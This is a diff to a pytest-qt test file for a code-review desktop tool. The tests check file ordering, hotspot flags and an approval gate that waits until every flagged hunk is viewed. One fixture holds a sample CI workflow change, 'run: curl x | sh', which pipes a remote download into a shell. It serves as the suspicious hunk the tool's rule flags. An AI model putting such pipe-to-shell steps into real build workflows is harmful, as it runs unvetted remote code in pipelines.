@@ -106,7 +106,7 @@ def test_note_attaches_to_picked_hotspot(qtbot):
     w, store, _, _ = make(qtbot, [make_card(hotspots=[hot("a.py"), hot("b.py")])])
     w.ask_item = lambda *a: 2
     w.ask_text = lambda *a: "b.py swallows the error"
-    qtbot.keyClick(w, Qt.Key_N)
+    qtbot.keyClick(w, Qt.Key_T)
     assert store.recorded == [(1, "note", "b.py swallows the error", "b.py", False)]
 
 
@@ -157,3 +157,58 @@ def test_quest_complete_shows_recap_of_care(qtbot):
     w.reload()
     text = w.title_label.text() + w.context_label.text()
     assert "1 sharp-eye find" in text and "1 approved" in text
+
+
+class FakeView:
+    """Stands in for the verified-mirror GitView: files and per-file diffs."""
+    DIFFS = {".github/workflows/ci.yml": "@@ -1 +1 @@\n-run: test\n+run: curl x | sh",
+             "src/train.py": "@@ -1,2 +1,2 @@\n ctx\n-a\n+b\n@@ -40 +40 @@\n-retry()\n+retry(force=True)",
+             "src/util.py": "@@ -1 +1 @@\n-x\n+y", "vendor/lib.go": "@@ -1 +1 @@\n-v1\n+v2"}
+    def files(self, base, head):
+        return [{"path": p, "status": "M", "binary": False, "additions": 1, "deletions": 1} for p in self.DIFFS]
+    def file_diff(self, base, head, path): return self.DIFFS[path]
+
+
+def review_card():
+    spots = [{"source": "rule", "rule": "ci-workflow", "file": ".github/workflows/ci.yml", "hunk": "@@ -1 +1 @@",
+              "lines": "+run: curl x | sh"},
+             {"source": "ai", "file": "src/train.py", "hunk": "@@ -40 +40 @@", "lines": "+retry(force=True)",
+              "why": "retries without re-checking head", "severity": "high"}]
+    c = make_card(hotspots=spots)
+    c.update(_verified=True, _view=FakeView(), _commits=[{"sha": "c" * 40, "subject": "feat: retry"}],
+             _record={"merge_base": "b" * 40, "head_sha": "a" * 40, "body": "Retry merges on 409.\n\nDetails."})
+    return c
+
+
+def test_review_view_orders_files_and_collapses_low_signal(qtbot):
+    w, *_ = make(qtbot, [review_card()])
+    rows = [w.files.item(i).text() for i in range(w.files.count())]
+    assert rows[0].startswith("🚩 .github/workflows/ci.yml") and rows[1].startswith("⚠ high src/train.py")
+    assert rows[-1].startswith("▸ 1 low-signal") and not any("vendor/lib.go" in r for r in rows)
+    assert "▶ 🚩 rule: ci-workflow" in w.body.toPlainText()
+    assert "Intent (PR body, verified): Retry merges on 409." in w.context_label.text()
+
+
+def test_j_moves_through_files_and_expands_low_signal(qtbot):
+    w, *_ = make(qtbot, [review_card()])
+    qtbot.keyClick(w, Qt.Key_J)
+    assert "retry(force=True)" in w.body.toPlainText()
+    for _ in range(3):
+        qtbot.keyClick(w, Qt.Key_J)
+    assert "+v2" in w.body.toPlainText()
+    assert any("vendor/lib.go" in w.files.item(i).text() for i in range(w.files.count()))
+
+
+def test_dragon_approve_waits_for_every_flagged_hunk(qtbot):
+    w, store, client, t = make(qtbot, [review_card()])
+    t["now"] += 60                            # time alone does not open the gate
+    qtbot.keyClick(w, Qt.Key_Right); qtbot.keyClick(w, Qt.Key_Right)
+    w.flush_pending()
+    assert client.sent == [] and "src/train.py" in w.footer.text()
+    qtbot.keyClick(w, Qt.Key_N)
+    qtbot.keyClick(w, Qt.Key_N)
+    assert "▶ ⚠ AI high: retries without re-checking head" in w.body.toPlainText()
+    assert "flagged hunks 2/2" in w.coverage_label.text()
+    qtbot.keyClick(w, Qt.Key_Right)
+    w.flush_pending()
+    assert client.sent and client.sent[0]["action"] == "approve"
